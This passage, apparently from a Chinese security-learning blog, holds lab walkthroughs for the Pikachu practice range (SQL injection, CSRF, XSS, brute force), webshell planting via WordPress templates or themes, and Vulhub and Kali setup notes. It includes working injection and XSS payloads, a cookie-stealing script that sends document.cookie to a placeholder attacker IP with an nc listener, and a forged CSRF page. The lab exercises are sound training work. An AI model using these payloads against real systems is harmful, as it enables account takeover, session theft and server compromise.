        <content type="html"><![CDATA[<h2 id="弱口令爆破"><a href="#弱口令爆破" class="headerlink" title="弱口令爆破"></a>弱口令爆破</h2><p>首先我们通过弱口令爆破拿到wordpress的账号和密码。</p><p>账号：admin 密码：123456</p><p><img src="https://pic.888888.al/i/2023/03/03/faajzy.jpg" alt="1"></p><h2 id="方法一：模板编辑"><a href="#方法一：模板编辑" class="headerlink" title="方法一：模板编辑"></a>方法一：模板编辑</h2><p>我们到外观-&gt;编辑这个模块，选择404模板，在404.php中写入php一句话木马。</p><p>点击更新文件<br><img src="https://pic.888888.al/i/2023/03/03/f975wn.jpg" alt="2"></p><p>我们可以看到在服务器后台的404.php文件中确实被我们写入了一句话木马了。<br><img src="https://pic.888888.al/i/2023/03/03/fbjwmd.jpg" alt="3"></p><p>我们妨问404.php并且用蚁剑尝试连接。<br><img src="https://pic.888888.al/i/2023/03/03/fcj0i9.jpg" alt="4"><br>连接成功！<br><img src="https://pic.888888.al/i/2023/03/03/fdub1b.jpg" alt="5"></p><h2 id="方法二：上传主题"><a href="#方法二：上传主题" class="headerlink" title="方法二：上传主题"></a>方法二：上传主题</h2><p>我们进入到外观-&gt;主题界面，将带有木马的文件写入主题中，再上传上去。<br><img src="https://pic.888888.al/i/2023/03/03/im4sz3.jpg" alt="6"></p><p>点击上传<br><img src="https://pic.888888.al/i/2023/03/03/inlh77.jpg" alt="7"><br>妨问这个主题中带有木马的文件<br><img src="https://pic.888888.al/i/2023/03/03/io7o4c.jpg" alt="8"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>模板编辑拿webshell</strong></p><p>通过修改模块写入一句话，网站再调用模板的时，会自动加载这个模板，运行后门。<br><strong>文件上传拿webshell</strong></p><p>通过后台的上传模块，上传网页后门，就可以拿到webshell。</p>]]></content>
      
      
      <categories>
          
          <category> webshell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachu靶场通关秘籍之SQL</title>
      <link href="/archives/c4c569e3.html"/>
      <url>/archives/c4c569e3.html</url>
      
        <content type="html"><![CDATA[<h2 id="Sql-Inject-SQL注入-介绍"><a href="#Sql-Inject-SQL注入-介绍" class="headerlink" title="Sql Inject(SQL注入)介绍"></a>Sql Inject(SQL注入)介绍</h2><pre><code>在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。**一个严重的SQL注入漏洞，可能会直接导致一家公司破产！SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；2.使用参数化（Parameterized Query 或 Parameterized Statement）；3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了&quot;拼接&quot;的方式,所以使用时需要慎重! SQL注入在网络上非常热门，也有很多技术专家写过非常详细的关于SQL注入漏洞的文章，这里就不在多写了。  </code></pre><h2 id="数字型注入-post"><a href="#数字型注入-post" class="headerlink" title="数字型注入(post)"></a>数字型注入(post)</h2><p>第一关，选择查询的id然后点击查询就能查询到数据，这时候我对查询进行抓包。<br><img src="https://pic.888888.al/i/2023/03/02/j4lor4.png" alt="1">  </p><p>右键 <em>Send to Repeater</em><br><img src="https://pic.888888.al/i/2023/03/02/j4xdvs.png" alt="2">  </p><p>我们在id这块进行测试，在后面添加 or 1&#x3D;1 发现有注入点:<br><img src="https://pic.888888.al/i/2023/03/02/j51bkx.png" alt="3">  </p><h2 id="字符型注入-get"><a href="#字符型注入-get" class="headerlink" title="字符型注入(get)"></a>字符型注入(get)</h2><p>输入想查找的东西，点击查询进行查找,这边我们直接在输入框中进行测试,和上题一样输入 <strong>lili or 1&#x3D;1#</strong>,发现有注入点：<br><img src="https://pic.888888.al/i/2023/03/02/j5jw79.png" alt="4"></p><h2 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h2><p>和上题一样 ，输入**lili\**破坏其内部数据库语句结构<br><img src="https://pic.888888.al/i/2023/03/02/j5o9n2.png" alt="5"><br><img src="https://pic.888888.al/i/2023/03/02/j5qtyi.png" alt="6">  </p><h2 id="“insert-x2F-update”注入"><a href="#“insert-x2F-update”注入" class="headerlink" title="“insert&#x2F;update”注入"></a>“insert&#x2F;update”注入</h2><p>这边我们点击<strong>注册</strong>，在用户栏进行注入。payload为:<strong>1’ and extractvalue(1,concat(0x7e,database())) and ‘</strong><br><img src="https://pic.888888.al/i/2023/03/02/j6672e.png" alt="7"><br><img src="https://pic.888888.al/i/2023/03/02/j6b45y.png" alt="8">  </p><h2 id="“delete”注入"><a href="#“delete”注入" class="headerlink" title="“delete”注入"></a>“delete”注入</h2><p>这里是一个留言板，我们随便写一点东西进去，鼠标移到 <em>删除</em> 在左下角可以看到<strong>id&#x3D;60</strong>,说明我们的数据是有id头的，所以点击删除抓包。<br><img src="https://pic.888888.al/i/2023/03/02/j6dpt9.png" alt="9"><br>我们在id&#x3D;60后面注入即可：<br><img src="https://pic.888888.al/i/2023/03/02/juig8t.png" alt="10"><br><img src="https://pic.888888.al/i/2023/03/02/julscr.png" alt="11">  </p><h2 id="“http-header”注入"><a href="#“http-header”注入" class="headerlink" title="“http header”注入"></a>“http header”注入</h2><p>有些时候，后台开发人员为了验证客户端头信息，比如常用的cookie验证，或者通过http请求头信息获取客户端的一些信息，比如useragent、accept字段等等，会对客户端的http请求头信息获取并使用sql进行处理，如果此时没有足够的安全考虑，则可能会导致基于http头的sql注入漏洞  </p><p>首先，我们点击 <em>点击退出</em> 抓包<br><img src="https://pic.888888.al/i/2023/03/02/jurv6r.png" alt="12">  </p><p>在<strong>User-Agent</strong>进行注入,payload为<strong>1’ and extractvalue(1,concat(0x7e,database())) and ‘</strong><br><img src="https://pic.888888.al/i/2023/03/02/jv2zig.png" alt="13">  </p><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>时间盲注主要使用if语句，通过延迟信息进行判断，不看回显信息，这里就不多说了，使用SQLMAP效果更佳，手动测试难免有误差。</p>]]></content>
      
      
      <categories>
          
          <category> pikachu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pikachu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachu靶场通关秘籍之CSRF</title>
      <link href="/archives/f3a6c1ad.html"/>
      <url>/archives/f3a6c1ad.html</url>
      
        <content type="html"><![CDATA[<h2 id="CSRF-跨站请求伪造-攻击介绍"><a href="#CSRF-跨站请求伪造-攻击介绍" class="headerlink" title="CSRF(跨站请求伪造)攻击介绍"></a>CSRF(跨站请求伪造)攻击介绍</h2><pre><code>Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为&quot;one click&quot;攻击。 很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆,更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。这里列举一个场景解释一下，希望能够帮助你理解。场景需求：小黑想要修改大白在购物网站tianxiewww.xx.com上填写的会员地址。先看下大白是如何修改自己的密码的：登录---修改会员信息，提交请求---修改成功。所以小黑想要修改大白的信息，他需要拥有：1，登录权限 2，修改个人信息的请求。但是大白又不会把自己xxx网站的账号密码告诉小黑，那小黑怎么办？于是他自己跑到www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：【http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change】于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录xxx网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了,小黑就完成了攻击目的。为啥小黑的操作能够实现呢。有如下几个关键点：1.www.xxx.com这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造;---因此，我们判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造。2.小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上;---如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。---因此，要成功实施一次CSRF攻击，需要“天时，地利，人和”的条件。当然，如果小黑事先在xxx网的首页如果发现了一个XSS漏洞，则小黑可能会这样做： 欺骗小白访问埋伏了XSS脚本（盗取cookie的脚本）的页面，小白中招，小黑拿到小白的cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。---所以跟上面比一下，就可以看出CSRF与XSS的区别：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。 因此，网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：--对敏感信息的操作增加安全的token；--对敏感信息的操作增加安全的验证码；--对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。如果你没有读太明白,不要犹豫,请再读一遍啦  </code></pre><h2 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h2><p>通过以上的介绍，我们知道要想构成CSRF攻击，首先得诱导受害者点击我们的网页。我们先进入到其中一个用户的内部。<br><img src="https://pic.888888.al/i/2023/03/02/j2gts1.png" alt="1"><br>点击修改个人信息，修改手机号，点击提交并抓包。<br><img src="https://pic.888888.al/i/2023/03/02/j2l5z2.png" alt="2"><br>将数据包中的<strong>GET</strong>和<strong>HOTS</strong>内容保存，并创建一个简单的html网页，代码如下:</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span> New Document <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UIF-8&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=&amp;phonenum=999&amp;add=&amp;email=&amp;submit=submit HTTP/1.1&quot;</span>&gt;</span>点我抽奖<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果如图:<br><img src="https://pic.888888.al/i/2023/03/02/j2nqcr.png" alt="3"></p><p>当用户点击 <em>点我抽奖</em> 时会触发CSRF攻击,直接修改了用户的手机号。<br><img src="https://pic.888888.al/i/2023/03/02/j2r07y.png" alt="4">  </p><h2 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h2><p>如果是POST型的，所有参数在请求体中提交，我们不能通过伪造URL的方式进行攻击  </p><p>攻击者可以搭建一个站点，在站点上做一个表单，诱导vince点击这个链接，当用户点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息。</p><p>这里我们用Burp Suite自带的csrf功能构造一个站点:<br><img src="https://pic.888888.al/i/2023/03/02/j3cru1.png" alt="5"><br><img src="https://pic.888888.al/i/2023/03/02/j3oh8l.png" alt="6"><br>同上面操作一样即可。  </p><h2 id="CSRF-token"><a href="#CSRF-token" class="headerlink" title="CSRF(token)"></a>CSRF(token)</h2><p><strong>CSRF的主要问题是敏感操作容易被伪造，我们可以加入Token让请求不容易被伪造，每次请求，都增加一个随机码（需要够随机，不容易被伪造），后台每次对这个随机码进行验证我们进入Pikachu平台的CSRF（token）页面并登录，我们可以看一下这个GET请求。</strong></p><p><strong>跟前面比较，这里多了一个Token，如果后台对提交的Token进行了验证，由于Token是随机的，我们就无法伪造URL了，对于token，暂时还没有什么办法通过</strong></p><p><strong>所以，使用token是一个很好的防御CSRF攻击的方法。</strong></p>]]></content>
      
      
      <categories>
          
          <category> pikachu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pikachu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachu靶场通关秘籍之XSS</title>
      <link href="/archives/77aee975.html"/>
      <url>/archives/77aee975.html</url>
      
        <content type="html"><![CDATA[<h2 id="跨站脚本攻击介绍"><a href="#跨站脚本攻击介绍" class="headerlink" title="跨站脚本攻击介绍"></a>跨站脚本攻击介绍</h2><p><strong>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型:</strong>  </p><pre><code>    1.反射性XSS;    2.存储型XSS;    3.DOM型XSS;XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:  输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;  输出转义：根据输出点的位置对输出到前端的内容进行适当转义;  </code></pre><h2 id="反射型XSS-get"><a href="#反射型XSS-get" class="headerlink" title="反射型XSS(get)"></a>反射型XSS(get)</h2><p>在输入框中输入 <strong>&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</strong> 即可：<br><img src="https://pic.888888.al/i/2023/03/02/jwi81x.png" alt="1">  </p><h2 id="反射型XSS-post"><a href="#反射型XSS-post" class="headerlink" title="反射型XSS(post)"></a>反射型XSS(post)</h2><p>先登录进去,同样在输入框中输入 <strong>&lt;script&gt;alert(1)&lt;/script&gt;</strong> 即可<br><img src="https://pic.888888.al/i/2023/03/02/jwkce0.png" alt="2">  </p><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>存储型XSS又称持久型XSS，攻击脚本将被永久地存放在目标服务器的数据库或文件中，具有很高的隐蔽性。  </p><p>同样在输入框中输入**&lt;script&gt;alert(1)&lt;&#x2F;script&gt;**，当有人浏览你的留言时都会触发XSS。<br><img src="https://pic.888888.al/i/2023/03/02/jww161.png" alt="3">  </p><h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>查看页面的源代码，找到输入框的位置，可以看到输入的东西在前端进行了过滤，所以只要把前面语法闭合掉，然后添加自己的语法即可,<strong>‘&gt;&lt;img src&#x3D;”#” onmouseover&#x3D;”alert(‘xss’)”&gt;</strong><br><img src="https://pic.888888.al/i/2023/03/02/jwy7xa.png" alt="4"><br><img src="https://pic.888888.al/i/2023/03/02/jx0ov5.png" alt="5">  </p><h2 id="DOM型XSS-X"><a href="#DOM型XSS-X" class="headerlink" title="DOM型XSS-X"></a>DOM型XSS-X</h2><p>同上一样的方法，审查一下js就好:<strong>‘&gt;&lt;img src&#x3D;”#” onmouseover&#x3D;”alert(‘xss’)”&gt;</strong><br><img src="https://pic.888888.al/i/2023/03/02/jx3oe7.png" alt="6"><br><img src="https://pic.888888.al/i/2023/03/02/jx5khc.png" alt="7">  </p><h2 id="XSS之盲打"><a href="#XSS之盲打" class="headerlink" title="XSS之盲打"></a>XSS之盲打</h2><p><strong>盲打就是前端不会做出任何反馈，只有后台管理员知道，你写了什么，这时候我们就要利用nc反弹来获得管理员的cookie，进而可以登录到后台。</strong>  </p><p>我们用这个payload来打<strong>&lt;script&gt;var img&#x3D;document.createElement(“img”);img.src&#x3D;”http:&#x2F;&#x2F;[你的ip]:4444&#x2F;a?”+escape(document.cookie);&lt;&#x2F;script&gt;</strong><br><img src="https://pic.888888.al/i/2023/03/02/jxgh13.png" alt="8">  </p><p>提交完之后，我们用nc监听:</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/02/jxj47b.png" alt="9"><br><strong>当管理员进入后台，看到我们写的东西后，nc也就监听到了:</strong><br><img src="https://pic.888888.al/i/2023/03/02/jxlgle.png" alt="10">  </p><h2 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h2><p>前端对我们提交的语句进行了过滤，考虑大小写绕过 <strong>&lt;Script&gt;alert(1)&lt;&#x2F;Script&gt;</strong><br><img src="https://pic.888888.al/i/2023/03/02/jxnm5w.png" alt="11"></p><h2 id="XSS之htmlspecialchars"><a href="#XSS之htmlspecialchars" class="headerlink" title="XSS之htmlspecialchars"></a>XSS之htmlspecialchars</h2><p>我们使用 <strong>‘ onclick&#x3D;’alert(1)’</strong>  payload去打:<br><img src="https://pic.888888.al/i/2023/03/02/jxpe0r.png" alt="12"></p><h2 id="XSS之href输出"><a href="#XSS之href输出" class="headerlink" title="XSS之href输出"></a>XSS之href输出</h2><p>通过分析得知直接使用js伪协议即可:<strong>javascript:alert(1)</strong><br><img src="https://pic.888888.al/i/2023/03/02/jxre6x.png" alt="13"></p><h2 id="XSS之js输出"><a href="#XSS之js输出" class="headerlink" title="XSS之js输出"></a>XSS之js输出</h2><p>通过分析得知， 他将我们输入的字符存到了js代码里面然后进行判断，我们可以根据代码写一个闭合:<strong>‘&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</strong><br><img src="https://pic.888888.al/i/2023/03/02/jy2q6x.png" alt="14"><br><img src="https://pic.888888.al/i/2023/03/02/jy4v8z.png" alt="15"></p>]]></content>
      
      
      <categories>
          
          <category> pikachu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pikachu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachu靶场通关秘籍之暴力破解</title>
      <link href="/archives/ec9ffc46.html"/>
      <url>/archives/ec9ffc46.html</url>
      
        <content type="html"><![CDATA[<h2 id="暴力破解介绍"><a href="#暴力破解介绍" class="headerlink" title="暴力破解介绍"></a>暴力破解介绍</h2><p><strong>这一关主要通过Burp Suite工具进行暴力破解，主要测试网站是否有弱口令漏洞。</strong></p><h2 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2><p>很简单的一个登录窗口<br><img src="https://pic.888888.al/i/2023/03/02/jyd8qp.png" alt="1"><br>我们先进一个抓包，再把数据报送到BP的 <em>intruder</em> 模块<br><img src="https://pic.888888.al/i/2023/03/02/jyno6p.png" alt="2"><br>进入到 <em>intruder</em> 点击 <em>clear</em> 再把<strong>username</strong>和<strong>password</strong>选中，攻击方式选择 <em>Cluster bomb</em><br><img src="https://pic.888888.al/i/2023/03/02/jyqd6t.png" alt="3"><br>点击 <em>Payloads</em> 添加字典<br><img src="https://pic.888888.al/i/2023/03/02/jyrvzb.png" alt="4"><br><img src="https://pic.888888.al/i/2023/03/02/jyv3fu.png" alt="5"><br>配置好后，点击右上角的 <em>Start attack</em>,等待攻击完成:<br><img src="https://pic.888888.al/i/2023/03/02/jz7swn.png" alt="6"><br>得到账号为<strong>admin</strong>，密码为<strong>123456</strong>  </p><p>尝试登录，登录成功。<br><img src="https://pic.888888.al/i/2023/03/02/jz9vcm.png" alt="7">  </p><h2 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h2><p><strong>这是一个带验证码的登录窗口，我要考虑的是爆破的时候，验证码会不会因为页面刷新而刷新。</strong> </p><p>和上一关一样，直接尝试暴力破解，发现验证码不会刷新，所以账号密码很容易就出来了。<br><img src="https://pic.888888.al/i/2023/03/02/jzvdvg.png" alt="9"><br>尝试登陆，登录成功<br><img src="https://pic.888888.al/i/2023/03/02/jzx9py.png" alt="10">  </p><h2 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h2><p><strong>同样是一个有验证码的登录窗口，用上一关的方法发现不行，验证码一直在变</strong><br><img src="https://pic.888888.al/i/2023/03/02/k02gia.png" alt="11">  </p><p>这时候我们F12查看这个页面的js代码:<br><img src="https://pic.888888.al/i/2023/03/02/k0i7cj.png" alt="12"><br><strong>发现这验证码是前端验证，前端验证是可以让我们随意更改的，这里提供一种方法，就是直接把浏览器的js功能关了</strong><br><img src="https://pic.888888.al/i/2023/03/02/k0kfd4.png" alt="13"><br>js功能关了后，直接就不需要验证码验证了，正常去爆破就好了。<br><img src="https://pic.888888.al/i/2023/03/02/k0mok0.png" alt="14">  </p><h2 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破?"></a>token防爆破?</h2><p><strong>最后一关，我们抓包发现其加了token防止我们暴力破解</strong><br><img src="https://pic.888888.al/i/2023/03/02/k0pq3s.png" alt="15">  </p><p>同样，我们先右键 <em>send to intruder</em> 攻击方式选择 <em>Pitchfork</em> 选中<strong>password</strong>和<strong>token</strong>：<br><img src="https://pic.888888.al/i/2023/03/02/k11bvi.png" alt="16">  </p><p>在payloads:1里面加入一些字典，然后点击 <em>Options</em>,_Number of threads改为1<br><img src="https://pic.888888.al/i/2023/03/02/k13pq1.png" alt="17">  </p><p>往下翻，点击 _Grep-Extract_中的 <em>add</em>,找到**name&#x3D;’token’**选中value里面的数字，让他自动生成一个正则表达式:<br><img src="https://pic.888888.al/i/2023/03/02/k16ght.png" alt="18"><br>点击ok后，继续往下翻，将 <em>Redirections</em> 中的 _Follow redirections_改为Always。<br><img src="https://pic.888888.al/i/2023/03/02/k194s1.png" alt="19">  </p><p>_Options_设置好后，到payloads:2里面，将 _Payload type_改为Recursive grep,在 <em>initial payload for first request</em> 中，将之前数据包中的token写到这里面:<br><img src="https://pic.888888.al/i/2023/03/02/k1qced.png" alt="20"><br><img src="https://pic.888888.al/i/2023/03/02/k1t0zu.png" alt="21">  </p><p>OK,可以开始暴力破解了:<br><img src="https://pic.888888.al/i/2023/03/02/k1vido.png" alt="22"><br>得到想要得账号密码，去登录：<br><img src="https://pic.888888.al/i/2023/03/02/k1xbqn.png" alt="23"></p>]]></content>
      
      
      <categories>
          
          <category> pikachu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pikachu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali搭建vulhub靶场</title>
      <link href="/archives/be82d226.html"/>
      <url>/archives/be82d226.html</url>
      
        <content type="html"><![CDATA[<h2 id="vulhub靶场介绍"><a href="#vulhub靶场介绍" class="headerlink" title="vulhub靶场介绍"></a>vulhub靶场介绍</h2><p>vulhub官网:<a href="https://vulhub.org/">https://vulhub.org/</a></p><p>Vulhub是一个基于docker和docker-compose的漏洞环境集合，进入对应目录并执行一条语句即可启动一个全新的漏洞环境，让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。</p><h2 id="搭建过程"><a href="#搭建过程" class="headerlink" title="搭建过程"></a>搭建过程</h2><h3 id="一、更新APT："><a href="#一、更新APT：" class="headerlink" title="一、更新APT："></a>一、更新APT：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update </span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/02/iwsoul.png" alt="1"></p><h3 id="二、安装https协议，CA证书"><a href="#二、安装https协议，CA证书" class="headerlink" title="二、安装https协议，CA证书"></a>二、安装https协议，CA证书</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install -y apt-transport-https ca-certificates</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/02/ixdunx.png" alt="2"></p><h3 id="三、安装docker"><a href="#三、安装docker" class="headerlink" title="三、安装docker"></a>三、安装docker</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install docker.io</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/02/ixrhy3.png" alt="3"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 查看版本        docker -v</span><br><span class="line">开启docker       systemctl start docker </span><br><span class="line">查看开启的环境    docker ps -a</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/02/ixvsqa.png" alt="4"></p><h3 id="四、安装PIP3"><a href="#四、安装PIP3" class="headerlink" title="四、安装PIP3"></a>四、安装PIP3</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install python3-pip</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/02/ixzjz6.png" alt="5"></p><h3 id="五、安装docker-compose"><a href="#五、安装docker-compose" class="headerlink" title="五、安装docker-compose"></a>五、安装docker-compose</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install docker-compose</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/02/iybn4s.png" alt="6"></p><h3 id="六、下载vulhub"><a href="#六、下载vulhub" class="headerlink" title="六、下载vulhub"></a>六、下载vulhub</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://gitee.com/puier/vulhub.git</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/02/iyfpzq.png" alt="7"></p><h3 id="七、验证靶场搭建成功"><a href="#七、验证靶场搭建成功" class="headerlink" title="七、验证靶场搭建成功"></a>七、验证靶场搭建成功</h3><p>这里以activemq中的CVE-2015-5654漏洞为例<br>首先进入到CVE-2015-5654文件中去。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd vulhub/activemq/CVE-2015-5654</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/02/iyj87n.png" alt="8"></p><p>接着：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对靶场进行编译：docker-compose build</span><br><span class="line">运行靶场：docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/02/iymfjt.png" alt="9"></p><p>查看开放的端口：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose ps</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/02/iyy2lj.png" alt="10"><br>发现其开放的端口为61616</p><p>在浏览器中访问:[IP]:61616，其中IP为你kali的ip地址<br><img src="https://pic.888888.al/i/2023/03/02/iz2jcy.png" alt="11"><br><strong>访问成功，即代表vulhub搭建成功</strong></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>之前想用centos搭建靶场，用物理机访问，但怎么也访问不了，在网上试了很多办法都没有成功，无奈选择kali。搭建过程也没有什么技巧，跟着步骤敲命令即可，如果下载失败，更改下载源就好了，网上也有教程，这里就不做赘述了。</p>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali汉化教程</title>
      <link href="/archives/4a17b156.html"/>
      <url>/archives/4a17b156.html</url>
      
        <content type="html"><![CDATA[<p>小伙伴有没有因为用不惯全英文kali而烦恼呢，这里教大家如何汉化kali。</p><h2 id="汉化教程"><a href="#汉化教程" class="headerlink" title="汉化教程"></a>汉化教程</h2><p>首先，此命令必须在root命令下进行，所以请先提权</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure><p>再输入以下命令:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpkg-reconfigure locales</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/02/j10yvc.png" alt="1"><br><img src="https://pic.888888.al/i/2023/03/02/j1dyqg.png" alt="2"></p><p>进入到此页面:<br><img src="https://pic.888888.al/i/2023/03/02/j1gqmg.png" alt="3"></p><p>选中其中的<strong>en_US.UTF-8 UTF-8 和 zh_CN.UTF-8 UTF-8</strong>（空格键为确定键，TAB键为返回）</p><p>设置完成后，重启：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure><p>最后：<br><img src="https://pic.888888.al/i/2023/03/02/j1k91r.png" alt="4"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>希望对大家有所帮助哦</strong></p>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
